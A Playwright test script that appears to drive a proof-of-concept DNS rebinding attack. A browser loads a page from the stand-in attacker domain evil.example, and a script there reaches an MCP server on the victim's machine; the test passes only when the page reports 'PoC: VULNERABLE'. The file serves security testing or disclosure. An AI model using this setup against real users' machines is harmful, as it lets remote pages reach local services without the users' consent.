// @ts-check
const { test, expect } = require('@playwright/test');

const REBIND_DOMAIN = process.env.REBIND_DOMAIN || 'evil.example';
const REBIND_PORT = parseInt(process.env.REBIND_PORT || '3000', 10);
const PAGE_URL = `http://${REBIND_DOMAIN}:${REBIND_PORT}/`;
const REBIND_TIMEOUT_MS = 35000;   // generous; rebind.js gives up at 30s

test('DNS rebind from attacker page invokes the victim MCP server', async ({ page }) => {
  test.setTimeout(60000);

  // Surface the page's console output to the test log so anyone watching
  // the run sees the rebind trace.
  page.on('console', msg => {
    console.log(`  [browser/${msg.type()}]  ${msg.text()}`);
  });

  console.log(`[playwright] navigating to ${PAGE_URL}`);
  await page.goto(PAGE_URL, { waitUntil: 'domcontentloaded' });
  console.log(`[playwright] page loaded; rebind.js is now executing`);

  // The page changes its <title> when the verdict is known:
  //   'PoC: VULNERABLE'    — rebind succeeded
  //   'PoC: INCONCLUSIVE'  — rebind timed out
  // Wait for one of those.
  await page.waitForFunction(
    () => document.title.startsWith('PoC:'),
    null,
    { timeout: REBIND_TIMEOUT_MS }
  );

  const title = await page.title();
  const resultText = await page.locator('#result').innerText();
  const traceText = await page.locator('#log').innerText();

  console.log(`\n[playwright] verdict: ${title}`);
  console.log(`[playwright] trace:\n${traceText.split('\n').map(l => '    ' + l).join('\n')}`);
  console.log(`[playwright] result:\n    ${resultText}\n`);

  // Test fails (non-zero exit) if rebind didn't succeed
  expect(title).toBe('PoC: VULNERABLE');
});
